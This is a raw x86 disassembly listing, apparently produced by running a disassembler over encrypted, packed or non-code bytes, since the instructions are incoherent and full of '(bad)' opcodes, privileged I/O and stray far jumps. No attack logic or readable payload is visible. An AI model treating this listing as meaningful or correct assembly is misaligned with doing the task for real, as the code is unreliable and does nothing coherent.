  4129a2:	mov    edi,0xd6d0053e
  4129a7:	and    al,BYTE PTR [ebp-0x1d]
  4129aa:	xor    al,0xbd
  4129ac:	push   cs
  4129ad:	imul   eax,ebx,0xffffff82
  4129b0:	test   al,0x1b
  4129b2:	or     esp,DWORD PTR [ecx+0x59]
  4129b5:	hlt    
  4129b6:	mov    ebp,0xab9d2c5c
  4129bb:	dec    ebp
  4129bc:	pusha  
  4129bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129be:	js     0x4129b2
  4129c0:	pop    esp
  4129c1:	es lahf 
  4129c3:	loopne 0x412a20
  4129c5:	jp     0x412958
  4129c7:	inc    edx
  4129c8:	lods   al,BYTE PTR ds:[esi]
  4129c9:	(bad)  
  4129ca:	test   eax,0x656c562e
  4129cf:	scas   eax,DWORD PTR es:[edi]
  4129d0:	test   al,0xb5
  4129d2:	outs   dx,DWORD PTR ds:[esi]
  4129d3:	mov    cl,0xb4
  4129d5:	xchg   DWORD PTR ds:0x51f4a18a,edi
  4129db:	pop    eax
  4129dc:	cmp    ebp,eax
  4129de:	(bad)  
  4129df:	sbb    eax,0x32e833fe
  4129e4:	pop    esi
  4129e5:	push   edi
  4129e6:	jl     0x412a05
  4129e8:	sub    DWORD PTR [eax],esi
  4129ea:	sbb    bl,dl
  4129ec:	xchg   esi,eax
  4129ee:	test   ah,ah
  4129f0:	cmp    al,0x94
  4129f2:	pop    edi
  4129f3:	fnstcw WORD PTR [edx-0x57]
  4129f6:	(bad)
  4129f9:	mov    eax,0x4b2adfe1
  4129fe:	mov    al,ds:0x7cfab44b
  412a03:	or     al,0xf7
  412a05:	stos   DWORD PTR es:[edi],eax
  412a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a07:	xchg   ecx,eax
  412a08:	and    al,0x25
  412a0a:	outs   dx,BYTE PTR ds:[esi]
  412a0b:	pop    ss
  412a0c:	mov    DWORD PTR [edx],ebx
  412a0e:	push   ds
  412a0f:	rcr    DWORD PTR [ebp+0x4c185e6b],1
  412a15:	jnp    0x4129d1
  412a17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a18:	lock (bad) 
  412a1a:	and    ecx,DWORD PTR [esi]
  412a1c:	iret   
  412a1d:	mov    bh,0x57
  412a1f:	scas   al,BYTE PTR es:[edi]
  412a20:	mov    esp,0x5f4a70ef
  412a25:	add    DWORD PTR es:[edi],ebx
  412a28:	fcom   DWORD PTR [ebx]
  412a2a:	scas   eax,DWORD PTR es:[edi]
  412a2b:	adc    eax,0xe65e3e4a
  412a30:	test   eax,0xb51ddd97
  412a35:	add    eax,0xf6341f0f
  412a3a:	je     0x412a95
  412a3c:	push   esi
  412a3d:	mov    ah,0x44
  412a3f:	xor    BYTE PTR [edx+0x50],ch
  412a42:	inc    edx
  412a43:	dec    edi
  412a44:	test   BYTE PTR [eax],0xdb
  412a47:	ins    DWORD PTR es:[edi],dx
  412a48:	xor    esp,edi
  412a4a:	stos   BYTE PTR es:[edi],al
  412a4b:	lods   al,BYTE PTR ds:[esi]
  412a4c:	rcl    DWORD PTR [edx+0x248029f1],cl
  412a52:	in     eax,0x6f
  412a54:	cmp    edx,DWORD PTR [ebx+0x4a]
  412a57:	mov    ebx,0x17c23218
  412a5c:	and    BYTE PTR [edi],al
  412a5e:	xor    eax,0x78cb1187
  412a63:	arpl   WORD PTR [edx],dx
  412a65:	inc    edx
  412a66:	cli    
  412a67:	cmp    esp,edx
  412a69:	in     al,0x2a
  412a6b:	sub    BYTE PTR [ebp+ebp*4-0x2b],bh
  412a6f:	fnstenv [ecx+0xd]
  412a72:	xchg   esp,eax
  412a73:	pushf  
  412a74:	ja     0x412a46
  412a76:	cmp    eax,0xfae0eb20
  412a7b:	mov    eax,0xd8817f1d
  412a80:	call   0x5e871852
  412a85:	data16 std 
  412a87:	(bad)  
  412a89:	out    0x4c,eax
  412a8b:	in     al,0x59
  412a8d:	jno    0x412a3a
  412a8f:	mov    al,0x14
  412a91:	imul   edi,eax,0x24
  412a94:	jne    0x412a26
  412a96:	push   0xcb1ac693
  412a9b:	jnp    0x412ad1
  412a9d:	pop    ecx
  412a9e:	ficom  WORD PTR [ecx+0x40]
  412aa1:	loop   0x412a4d
  412aa3:	push   esp
  412aa4:	xor    edx,eax
  412aa6:	pop    edx
  412aa7:	xchg   bh,ah
  412aa9:	shr    BYTE PTR [edi-0x5],1
  412aac:	outs   dx,BYTE PTR ds:[esi]
  412aad:	std    
  412aae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412aaf:	cmp    BYTE PTR [edx-0x6c236849],bh
  412ab5:	aam    0x76
  412ab7:	or     BYTE PTR [esi-0x1c95184b],al
  412abd:	ror    DWORD PTR [edx+eax*2],0x2a
  412ac1:	mov    ds:0xf9851ab1,al
  412ac6:	sbb    al,dh
  412ac8:	sbb    DWORD PTR [ebx],eax
  412aca:	in     eax,0xae
  412acc:	test   ebx,edi
  412ace:	add    eax,0x64bc56b0
  412ad3:	sub    ebp,DWORD PTR [ecx-0x5b50fc3f]
  412ad9:	and    al,0xf8
  412adb:	je     0x412ae0
  412add:	sbb    BYTE PTR [edx+0x50d21684],bl
  412ae3:	into   
  412ae4:	hlt    
  412ae5:	jle    0x412ace
  412ae7:	jecxz  0x412adf
  412ae9:	jne    0x412afe
  412aeb:	adc    ax,0xfb51
  412aef:	retf   
  412af0:	std    
  412af1:	out    0x63,al
  412af3:	mov    esp,0x3428e903
  412af8:	out    dx,eax
  412af9:	inc    edx
  412afa:	sub    eax,ebp
  412afc:	ret    0x79f8
  412aff:	adc    al,0x7
  412b01:	pop    esp
  412b02:	mov    ebx,cs
  412b04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b05:	sub    esi,ecx
  412b07:	push   eax
  412b08:	cld    
  412b09:	aad    0x1c
  412b0b:	push   esp
  412b0c:	adc    edi,edx
  412b0e:	icebp  
  412b0f:	addr16 (bad) 
  412b11:	dec    ebx
  412b12:	mov    DWORD PTR [esi-0xe],ebp
  412b15:	(bad)  [ecx+0x44164836]
  412b1b:	in     al,dx
  412b1c:	test   BYTE PTR [esp+eax*1],cl
  412b1f:	or     al,bh
  412b21:	data16 fld DWORD PTR [ecx-0x4f]
  412b25:	out    0x86,al
  412b27:	xlat   BYTE PTR ds:[ebx]
  412b28:	cmp    cl,0xe9
  412b2b:	pop    es
  412b2c:	xchg   esp,eax
  412b2d:	xor    BYTE PTR [edi+0x1c],al
  412b30:	or     bh,BYTE PTR ds:0x5cffb829
  412b36:	in     eax,0xfc
  412b38:	pop    es
  412b39:	repz addr16 and al,0x7c
  412b3d:	jnp    0x412b0e
  412b3f:	pusha  
  412b40:	ins    BYTE PTR es:[edi],dx
  412b41:	fldl2e 
  412b43:	cmp    al,0xcf
  412b45:	xor    eax,0x43b65be1
  412b4a:	lahf   
  412b4b:	jmp    0xb721:0x5a01ba0f
  412b52:	inc    DWORD PTR [esi]
  412b54:	mov    dl,BYTE PTR [ebx-0x2a]
  412b57:	ja     0x412b5e
  412b59:	ins    DWORD PTR es:[edi],dx
  412b5a:	test   DWORD PTR [edx+ecx*2],esi
  412b5d:	je     0x412bda
  412b5f:	cmp    DWORD PTR [esi+0x785a454e],ecx
  412b65:	adc    DWORD PTR [esi+0x78814938],edi
  412b6b:	mov    edi,0x98de997
  412b70:	inc    edx
  412b71:	je     0x412b12
  412b73:	mov    dh,0x73
  412b75:	push   es
  412b76:	push   ss
  412b77:	pop    ss
  412b78:	xor    BYTE PTR [edx],al
  412b7a:	out    dx,al
  412b7b:	call   0xf7d0:0xe8c1462c
  412b82:	mov    ds,WORD PTR [eax]
  412b84:	daa    
  412b85:	call   FWORD PTR [edx]
  412b87:	pop    DWORD PTR [ebp+0x37]
  412b8a:	addr16 xchg ebp,eax
  412b8c:	ret    
  412b8d:	mov    ch,0x39
  412b8f:	aas    
  412b90:	push   0xeb6261af
  412b95:	push   esi
  412b96:	repz les esp,FWORD PTR [edi+0x3a016d75]
  412b9d:	cmp    al,0xe9
  412b9f:	cmp    DWORD PTR [edx+ecx*4],0xa28e1ea4
  412ba6:	popa   
  412ba7:	and    DWORD PTR [ebp-0x5938fd4f],edx
  412bad:	cmp    dl,BYTE PTR [ebp-0x2d6e81c0]
  412bb3:	mov    al,ds:0xc8e3afb5
  412bb8:	dec    esi
  412bb9:	mov    ebx,0x3d4c76cf
  412bbe:	rcr    bh,1
  412bc0:	add    edx,DWORD PTR [edi+0x6791114c]
  412bc6:	outs   dx,DWORD PTR es:[esi]
  412bc8:	push   eax
  412bc9:	rcl    bl,1
  412bcb:	cmp    BYTE PTR [eax+0x3f34d831],cl
  412bd1:	xchg   ebx,eax
  412bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bd3:	rcr    BYTE PTR [eax+eiz*2],0x28
  412bd7:	rol    BYTE PTR [ebp-0x633a136a],0xa
  412bde:	mov    cl,0x1a
  412be0:	sbb    al,0x93
  412be2:	jmp    0xca711f09
  412be7:	ja     0x412c61
  412be9:	retf   0x1132
  412bec:	mov    al,ds:0xed47273d
  412bf1:	and    BYTE PTR [edx+0x68],bl
  412bf4:	int3   
  412bf5:	aaa    
  412bf6:	ins    DWORD PTR es:[edi],dx
  412bf7:	mov    dh,0x39
  412bf9:	jg     0x412c52
  412bfb:	and    DWORD PTR [ebx+0x73],ecx
  412bfe:	adc    bh,ch
  412c00:	out    0x61,eax
  412c02:	fwait
  412c03:	(bad)  
  412c04:	mov    ds:0x4bd89e0a,al
  412c09:	adc    esp,0xffffff84
  412c0c:	or     eax,0xc8f6cf38
  412c11:	jmp    0x412bee
  412c13:	dec    esi
  412c14:	push   ebx
  412c15:	ffree  st(1)
  412c17:	call   0x6be1:0x89a983a
  412c1e:	xchg   ecx,eax
  412c1f:	loope  0x412c77
  412c21:	or     BYTE PTR [eax],dl
  412c23:	cdq    
  412c24:	xor    esi,ebx
  412c26:	mov    gs,eax
  412c28:	fadd   DWORD PTR [eax-0x14]
  412c2b:	mov    edi,ds
  412c2d:	in     eax,dx
  412c2e:	scas   eax,DWORD PTR es:[edi]
  412c2f:	pop    es
  412c30:	inc    edx
  412c31:	test   DWORD PTR [bx+di],0xacacc3e
  412c38:	lds    esp,FWORD PTR [esi*1+0x15af59f5]
  412c3f:	mov    eax,0xce37421f
  412c44:	mov    ah,0x66
  412c46:	mov    eax,ds:0xde7d35c4
  412c4b:	sbb    cx,WORD PTR [ebp+eiz*1+0x69fd9f94]
  412c53:	push   ebp
  412c54:	iret   
  412c55:	shl    BYTE PTR [esi+0x2e],1
  412c58:	hlt    
  412c59:	in     al,0x88
  412c5b:	div    dl
  412c5d:	jp     0x412bf9
  412c5f:	(bad)  [esi]
  412c61:	push   0x910ada92
  412c66:	icebp  
  412c67:	addr16 (bad) 
  412c69:	fmul   DWORD PTR [esi]
  412c6b:	pop    esp
  412c6c:	pop    es
  412c6d:	js     0x412cab
  412c6f:	div    BYTE PTR [edi+edi*1-0x6dd5a490]
  412c76:	mov    esp,0x32910d65
  412c7b:	mov    BYTE PTR [edx],ah
  412c7d:	imul   edi,DWORD PTR [ebx+0x2a068718],0xccf2eeb6
  412c87:	dec    edi
  412c88:	and    dh,BYTE PTR cs:[ebp+ebp*8+0x59]
  412c8d:	lods   al,BYTE PTR ds:[esi]
  412c8e:	into   
  412c8f:	dec    esp
  412c90:	jmp    0x1d7e:0xa917d723
  412c97:	out    dx,eax
  412c98:	push   cs
  412c99:	out    0x39,al
  412c9b:	push   esp
  412c9c:	or     DWORD PTR [ebx-0x729ca6c],edi
  412ca2:	push   0x7d8806ed
  412ca7:	sahf   
  412ca8:	bound  eax,QWORD PTR [eax+0x40637035]
  412cae:	int3   
  412caf:	cmp    al,0x55
  412cb1:	adc    ebp,esp
  412cb3:	push   edx
  412cb4:	mov    eax,ds:0xb5908ef5
  412cb9:	xor    DWORD PTR [ebx],edx
  412cbb:	sub    eax,0xe20d8098
  412cc0:	sbb    ebx,DWORD PTR [edi-0x46668ab6]
  412cc6:	pop    ds
  412cc7:	shr    DWORD PTR [edx+ebx*2-0x35986c04],cl
  412cce:	mov    ch,0xac
  412cd0:	dec    ecx
  412cd1:	sbb    ecx,DWORD PTR [ecx-0x3d5d6863]
  412cd7:	mov    edx,0xc41b57bb
  412cdc:	mov    cl,0xad
  412cde:	mov    eax,ds:0x4431a0b6
  412ce3:	pushf  
  412ce4:	leave  
  412ce5:	push   edi
  412ce6:	adc    DWORD PTR [edx+0x2c2f7c67],0xffffff84
  412ced:	retf   0x9fa7
  412cf0:	jbe    0x412c8c
  412cf2:	push   es
  412cf3:	sub    DWORD PTR [edx-0x624ef65f],eax
  412cf9:	xchg   edx,eax
  412cfa:	add    cl,dl
  412cfc:	mov    dl,0xee
  412cfe:	sbb    ebx,ecx
  412d00:	mov    esp,0x9db200c3
  412d05:	cs pop ecx
  412d07:	jl     0x412d40
  412d09:	lahf   
  412d0a:	push   0xa86b764a
  412d0f:	scas   eax,DWORD PTR es:[edi]
  412d10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d11:	test   eax,0xe112ae8a
  412d16:	dec    ebp
  412d17:	int    0xeb
  412d19:	mov    bl,0x53
  412d1b:	cmp    al,0x84
  412d1d:	sar    ch,1
  412d1f:	cmp    DWORD PTR [esi],esp
  412d21:	icebp  
  412d22:	inc    ecx
  412d23:	xchg   edi,eax
  412d24:	(bad)  
  412d26:	inc    ebp
  412d27:	in     al,dx
  412d28:	mov    BYTE PTR [edx+0x79],0x2b
  412d2c:	inc    esi
  412d2d:	in     eax,0xe3
  412d2f:	sbb    BYTE PTR [eax-0x1c013989],bl
  412d35:	fs pop ecx
  412d37:	stc    
  412d38:	in     al,dx
  412d39:	add    eax,ebx
  412d3b:	sbb    al,dl
  412d3d:	add    eax,ebp
  412d3f:	push   cs
  412d40:	imul   eax,DWORD PTR [ebx+0x6f],0xec0d4845
  412d47:	and    DWORD PTR [ecx],0x96d8e3dd
  412d4d:	ins    BYTE PTR es:[edi],dx
  412d4e:	nop    DWORD PTR [ecx]
  412d51:	call   0x12ee3503
  412d56:	sbb    eax,0x9036cdc8
  412d5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d5c:	in     al,dx
  412d5d:	xchg   esp,eax
  412d5e:	in     eax,dx
  412d5f:	gs aam 0xcf
  412d62:	pop    eax
  412d63:	fidivr WORD PTR [edx-0x49]
  412d66:	ret    
  412d67:	sbb    esi,ebp
  412d69:	int    0x7e
  412d6b:	fnstsw WORD PTR [esi+0x5828dea]
  412d71:	xor    edx,DWORD PTR [edx+ecx*8+0x1b137dc0]
  412d78:	jnp    0x412d03
  412d7a:	je     0x412ddd
  412d7c:	jmp    0x412dad
  412d7e:	add    al,0xf6
  412d80:	push   0xba8a00b3
  412d85:	xor    edi,ecx
  412d87:	xchg   esi,eax
  412d88:	mov    ch,0xc3
  412d8a:	jns    0x412d18
  412d8c:	(bad)  
  412d8d:	fstp   DWORD PTR [ecx]
  412d8f:	dec    edi
  412d90:	mov    ah,0xd7
  412d92:	mov    dl,0xd0
  412d94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d95:	test   BYTE PTR [edx],bh
  412d97:	vpmacswd ymm9,ymm4,ymm5,YMMWORD PTR [edi-0x56056bc4]
  412da1:	push   ds
  412da2:	xchg   esi,eax
  412da3:	not    DWORD PTR [edi-0x42]
  412da6:	leave  
  412da7:	jbe    0x412de6
  412da9:	xchg   ecx,eax
  412daa:	imul   ebx,DWORD PTR [esi-0x36],0x2f
  412dae:	mov    dh,0x46
  412db0:	pop    eax
  412db1:	push   0x27
  412db3:	xchg   ecx,eax
  412db4:	or     al,0x7
  412db6:	enter  0x1663,0x6
  412dba:	lea    ecx,[ecx]
  412dbc:	imul   esp,DWORD PTR [edi+0x2c505eb2],0xffffffec
  412dc3:	out    0x95,al
  412dc5:	mov    ds:0xe21a8e9c,eax
  412dca:	sbb    edi,esp
  412dcc:	add    eax,0xded0ec55
  412dd1:	xchg   ebp,eax
  412dd2:	in     eax,dx
  412dd3:	xchg   ebp,eax
  412dd4:	jp     0x412df4
  412dd6:	xchg   DWORD PTR [ebp-0x3b190f31],esi
  412ddc:	and    eax,0xbcc87e62
  412de1:	or     eax,DWORD PTR [eax+0x65]
  412de4:	mov    ecx,0x3c8a6cb9
  412de9:	stos   DWORD PTR es:[edi],eax
  412dea:	mov    bl,BYTE PTR [edx]
  412dec:	dec    edx
  412ded:	fwait
  412dee:	xor    dh,BYTE PTR [bx+di]
  412df1:	mov    ecx,0xec714b4f
  412df6:	pop    edx
  412df7:	pop    es
  412df8:	dec    esp
  412df9:	mov    esi,0xa7610fe3
  412dfe:	dec    ebp
  412dff:	dec    ecx
  412e00:	inc    edi
  412e01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e03:	push   esp
  412e04:	pop    esi
  412e05:	(bad)  
  412e06:	and    BYTE PTR [esi],ah
  412e08:	out    dx,eax
  412e09:	clc    
  412e0a:	dec    edx
  412e0b:	fisttp DWORD PTR [edx-0x5ecdc926]
  412e11:	imul   ecx
  412e13:	pop    ebx
  412e14:	push   cs
  412e15:	pop    eax
  412e16:	cmp    BYTE PTR [edi-0x3da597a4],ch
  412e1c:	sub    al,0x6d
  412e1e:	(bad)  
  412e1f:	mov    ecx,0x40079405
  412e24:	das    
  412e25:	mov    esp,0xa953718b
  412e2a:	cmp    ah,BYTE PTR [edx+0x31b3b56e]
  412e30:	fs jmp 0x412e47
  412e33:	in     al,0xda
  412e35:	or     DWORD PTR [di+0x3d33],esp
  412e3a:	add    DWORD PTR [edi+0x2ad05be9],ebp
  412e40:	cmp    DWORD PTR [bp+si],edx
  412e43:	test   eax,esp
  412e45:	xor    cl,dl
  412e47:	push   es
  412e48:	inc    esi
  412e49:	push   ss
  412e4a:	repnz (bad) 
  412e4c:	mov    ch,0x1c
  412e4e:	jb     0x412dfb
  412e50:	mov    WORD PTR [ebp+0x32975667],fs
  412e56:	leave  
  412e57:	adc    BYTE PTR [edi-0x69],ah
  412e5a:	stos   BYTE PTR es:[edi],al
  412e5b:	mov    ebx,0x54a69b6f
  412e60:	mov    ds:0x60b50e9f,al
  412e65:	stc    
  412e66:	cld    
  412e67:	(bad)  
  412e68:	mov    al,0x32
  412e6a:	xor    eax,0xa1b5aff8
  412e6f:	sbb    BYTE PTR [esi+edi*4+0x6d],ah
  412e73:	pop    ds
  412e74:	sbb    eax,0xdc816a92
  412e79:	inc    eax
  412e7a:	call   0xa1a2a1d5
  412e7f:	jne    0x41d787bd
  412e85:	ret    
  412e86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e87:	xchg   esi,eax
  412e88:	rcr    BYTE PTR [ecx],0xa2
  412e8b:	ins    BYTE PTR es:[edi],dx
  412e8c:	test   eax,0xaabb3681
  412e91:	add    DWORD PTR [edx+edi*8],ebp
  412e94:	mov    edx,0xca24d3d5
  412e99:	dec    edx
  412e9a:	jle    0x412ee1
  412e9c:	lds    ebx,FWORD PTR [eax+ecx*4+0xdb68eff]
  412ea3:	enter  0x8cc1,0x58
  412ea7:	and    DWORD PTR [edi+esi*4],ebx
  412eaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eab:	(bad)  
  412eac:	sti    
  412ead:	ja     0x412e78
  412eaf:	bound  eax,QWORD PTR [esi+0x49]
  412eb2:	xchg   esi,eax
  412eb3:	mov    ebx,0x8dfc0d45
  412eb8:	cmp    DWORD PTR [ecx-0x3b55e9b9],ecx
  412ebe:	and    DWORD PTR [edx],edx
  412ec0:	xlat   BYTE PTR ds:[ebx]
  412ec1:	jmp    0xd40624e4
  412ec6:	frstor [edx+0x307d9f2c]
  412ecc:	mov    bl,0x94
  412ece:	cwde   
  412ecf:	mov    eax,ds:0x1ec98f0e
  412ed4:	cmp    eax,0x34f59a1d
  412ed9:	test   ebx,eax
  412edb:	pop    ebp
  412edc:	push   ebp
  412edd:	in     eax,0xf5
  412edf:	popf   
  412ee0:	retf   0x161d
  412ee3:	or     ah,ch
  412ee5:	xor    BYTE PTR [edi-0x26e2d47d],bl
  412eeb:	les    edi,FWORD PTR [edx]
  412eed:	(bad)  
  412eee:	cmp    al,0xd1
  412ef0:	or     al,0xd1
  412ef2:	js     0x412ee8
  412ef4:	jo     0x412eff
  412ef6:	dec    ebp
  412ef7:	add    al,0x6d
  412efa:	push   ebp
  412efb:	ret    
  412efc:	(bad)  
  412efd:	xor    dl,BYTE PTR [ebx-0x4c]
  412f00:	xor    DWORD PTR [edi-0x66ebee57],ebx
  412f06:	(bad)  
  412f07:	xchg   ebx,eax
  412f08:	out    dx,al
  412f09:	xor    al,0x4c
  412f0b:	enter  0x498c,0xf5
  412f0f:	push   ebp
  412f10:	mov    ebp,0xf6eae4f3
  412f15:	icebp  
  412f16:	dec    edx
  412f17:	mov    ebx,0x514371db
  412f1c:	std    
  412f1d:	push   ecx
  412f1e:	pop    ds
  412f1f:	pop    ds
  412f20:	cmc    
  412f21:	mov    gs,WORD PTR [esi]
  412f23:	add    dh,cl
  412f25:	leave  
  412f26:	and    eax,0xbdb17b81
  412f2b:	cmp    ecx,DWORD PTR [ebx]
  412f2d:	dec    edx
  412f2e:	xchg   edi,eax
  412f2f:	fcomip st,st(7)
  412f31:	retfw  
  412f33:	mov    ah,al
  412f35:	mov    dl,0x65
  412f37:	(bad)
  412f3b:	stos   DWORD PTR es:[edi],eax
  412f3c:	inc    eax
  412f3d:	dec    esi
  412f3e:	xor    eax,0xc529ff3b
  412f43:	xchg   esi,eax
  412f44:	jne    0x412f9c
  412f46:	clc    
  412f47:	addr16 (bad) 
  412f49:	fadd   DWORD PTR [esi+0x13defa9]
  412f4f:	pop    ecx
  412f50:	in     eax,dx
  412f51:	adc    dh,cl
  412f53:	fst    st(3)
  412f55:	stos   DWORD PTR es:[edi],eax
  412f56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f57:	in     eax,dx
  412f58:	rol    BYTE PTR [edx+edx*1],cl
  412f5b:	jmp    0xb25c0014
  412f60:	shl    DWORD PTR [ecx-0x3fe9e721],0xe0
  412f67:	mov    ebx,fs
  412f69:	sbb    ax,0xb8e
  412f6d:	add    DWORD PTR [edx+edx*4],0x4f1caa62
  412f74:	and    bh,BYTE PTR [ebp*1-0x1d579e41]
  412f7b:	shl    bh,0xa0
  412f7e:	enter  0x7bdb,0xca
  412f82:	mov    ecx,0xfb30e14c
  412f87:	in     eax,0x55
  412f89:	aas    
  412f8a:	add    bh,bl
  412f8c:	adc    WORD PTR [eax+ebx*2+0x3a],bx
  412f91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f92:	sub    al,0xda
  412f94:	or     BYTE PTR [ecx+0x46c58b52],0xf
  412f9b:	sub    DWORD PTR [ebp+0x2569c9a1],0x49
  412fa2:	xchg   ecx,eax
  412fa3:	sbb    eax,0xff778f9e
  412fa8:	lds    eax,FWORD PTR [esi+0x6992110e]
  412fae:	iret   
  412faf:	dec    ebp
  412fb0:	daa    
  412fb1:	jno    0x412f53
  412fb3:	mov    DWORD PTR [ebx-0x29],edx
  412fb6:	sbb    esp,DWORD PTR [eax+0x2b]
  412fb9:	inc    esi
  412fba:	mov    esp,0x583e5d52
  412fbf:	and    eax,0x2ac6c228
  412fc4:	sbb    ah,BYTE PTR [ebx]
  412fc6:	addr16 pop ebx
  412fc8:	push   ebx
  412fc9:	mov    bl,0x8e
  412fcb:	das    
  412fcc:	add    ebx,DWORD PTR [esp+ecx*4+0x50a152af]
  412fd3:	adc    ah,BYTE PTR [ebp*2-0x5e306896]
  412fda:	loop   0x412f86
  412fdc:	and    DWORD PTR [edi-0x1ea7ff57],edi
  412fe2:	sbb    cl,cl
  412fe4:	pop    esp
  412fe5:	mov    al,ds:0x10f054b9
  412fea:	push   esp
  412feb:	cs aad 0xd1
  412fee:	mov    eax,0x8fe78e9
  412ff3:	pusha  
  412ff4:	jmp    0x41304f
  412ff6:	popa   
  412ff7:	test   BYTE PTR [ecx+0x29],al
  412ffa:	imul   ebx,esi,0xa813ea65
  413000:	pop    ecx
  413001:	gs popa 
  413003:	data16 clc 
  413005:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413006:	or     eax,DWORD PTR [esi-0x58]
  413009:	mov    BYTE PTR [edi-0x7ea5de12],bl
  41300f:	cli    
  413010:	add    eax,0x393f27d5
  413015:	xor    ch,BYTE PTR [esi]
  413017:	mov    ebx,0x30ff6aec
  41301c:	xchg   esi,eax
  41301d:	jecxz  0x41307c
  41301f:	repnz sub ebx,DWORD PTR [esi-0x71e6ffdd]
  413026:	adc    eax,0xdf733eab
  41302b:	jmp    0xe4937866
  413030:	mov    al,0xad
  413032:	(bad)  [ebp-0x67]
  413035:	movups XMMWORD PTR [ebx-0x6ba725e2],xmm1
  41303c:	cli    
  41303d:	xchg   BYTE PTR [eax],ah
  41303f:	iret   
  413040:	sbb    BYTE PTR [ecx+0x30],al
  413043:	xchg   dl,ah
  413045:	xchg   esp,eax
  413046:	call   0x5786be1f
  41304b:	add    bl,al
  41304d:	(bad)  
  41304e:	fdiv   QWORD PTR [ebp+0x527d6ab2]
  413054:	bound  ebp,QWORD PTR [edx]
  413056:	jno    0x412ffb
  413058:	test   al,0x84
  41305a:	add    esi,DWORD PTR [eax-0x6]
  41305d:	je     0x4130b3
  41305f:	sub    esp,DWORD PTR [edx+0x45]
  413062:	aam    0x91
  413064:	mov    gs,WORD PTR [ecx+0x27ebbeb]
  41306a:	jb     0x412fec
  41306c:	sub    dh,BYTE PTR [ecx-0x3542a8e6]
  413072:	hlt    
  413073:	clc    
  413074:	xor    cl,BYTE PTR [edi-0x2efa0faa]
  41307a:	cmp    al,0xbf
  41307c:	pop    esi
  41307d:	cmc    
  41307e:	sahf   
  41307f:	scas   eax,DWORD PTR es:[edi]
  413080:	xor    eax,0x9aacd895
  413085:	push   esp
  413086:	ror    al,0xdb
  413089:	shl    BYTE PTR [esi],cl
  41308b:	add    DWORD PTR [esi+0x78],ebp
  41308e:	cmp    eax,0x6fd17d3b
  413093:	mov    eax,0x4280dd37
  413098:	cdq    
  413099:	push   DWORD PTR [ebp+0x38]
  41309c:	inc    eax
  41309d:	mov    al,ds:0xef5b9bf5
  4130a2:	out    0x83,al
  4130a4:	jge    0x4130ee
  4130a6:	rol    BYTE PTR [esi],1
  4130a8:	shr    ch,0x5b
  4130ab:	div    DWORD PTR [ebx-0x16ddeec2]
  4130b1:	mov    ebp,0xdb406617
  4130b6:	daa    
  4130b7:	or     al,0x13
  4130b9:	mov    cl,BYTE PTR [ebx-0x30]
  4130bc:	dec    ebx
  4130bd:	xchg   dl,bh
  4130bf:	push   0x3
  4130c1:	sbb    bl,dl
  4130c3:	pop    ebx
  4130c4:	push   ebx
  4130c5:	std    
  4130c6:	inc    edx
  4130c7:	les    edi,FWORD PTR [ecx-0x17f4bf7]
  4130cd:	das    
  4130ce:	icebp  
  4130cf:	mov    edx,DWORD PTR [ecx]
  4130d1:	gs jp  0x41307e
  4130d4:	push   ecx
  4130d5:	clc    
  4130d6:	xchg   ebp,eax
  4130d7:	fstp   DWORD PTR [eax+0x6234a710]
  4130dd:	cld    
  4130de:	pop    esp
  4130df:	das    
  4130e0:	dec    ecx
  4130e1:	ja     0x4130c5
  4130e3:	std    
  4130e4:	sbb    BYTE PTR [edi+ecx*4-0x46],dh
  4130e8:	fwait
  4130e9:	stos   DWORD PTR es:[edi],eax
  4130ea:	jnp    0x41312b
  4130ec:	js     0x413154
  4130ee:	es and dl,bh
  4130f1:	sbb    edi,eax
  4130f3:	nop
  4130f4:	ret    
  4130f5:	xchg   ebx,eax
  4130f6:	(bad)  
  4130f7:	cli    
  4130f8:	sbb    eax,0x1caf8d91
  4130fd:	jl     0x4130d5
  4130ff:	xchg   ebp,eax
  413100:	out    0xed,al
  413102:	push   edx
  413103:	jo     0x4130a9
  413105:	in     al,dx
  413106:	cmp    al,0x42
  413108:	mov    ah,0xbe
  41310a:	shr    ah,cl
  41310c:	or     eax,0x2aea2374
  413111:	aaa    
  413112:	jecxz  0x4130ca
  413114:	or     dl,BYTE PTR [ebx-0x1b601bfb]
  41311a:	fidiv  DWORD PTR [edi-0x30e56f4d]
  413120:	in     al,dx
  413121:	fucom  st(5)
  413123:	femms  
  413125:	xchg   DWORD PTR [ecx-0x12ade5d4],eax
  41312b:	(bad)  
  41312c:	mov    cl,0x9e
  41312e:	ss cmp ch,dh
  413131:	pop    edx
  413132:	add    ebx,esi
  413134:	adc    DWORD PTR ds:0x8dbac6aa,ebp
  41313a:	adc    edx,DWORD PTR [edi+0x36]
  41313d:	jl     0x413172
  41313f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413140:	(bad)
  413144:	jl     0x4130fe
  413146:	ja     0x41311d
  413148:	dec    esp
  413149:	(bad)  
  41314a:	daa    
  41314b:	(bad)  
  41314c:	fld    QWORD PTR ds:0xc63e95a5
  413152:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413153:	ja     0x413187
  413155:	adc    DWORD PTR [ebp+0x21b48a7b],ebp
  41315b:	aas    
  41315c:	aam    0x4f
  41315e:	bnd jl 0x4130fe
  413161:	add    ecx,DWORD PTR ds:0x183da844
  413167:	stc    
  413168:	cmp    eax,0x46c06e0c
  41316d:	jbe    0x4131d7
  41316f:	out    dx,al
  413170:	test   BYTE PTR [ebp+0x24],dl
  413173:	cmp    dh,BYTE PTR [esi+0x3e132100]
  413179:	and    eax,0x6604a2e4
  41317e:	adc    DWORD PTR [eax],ebp
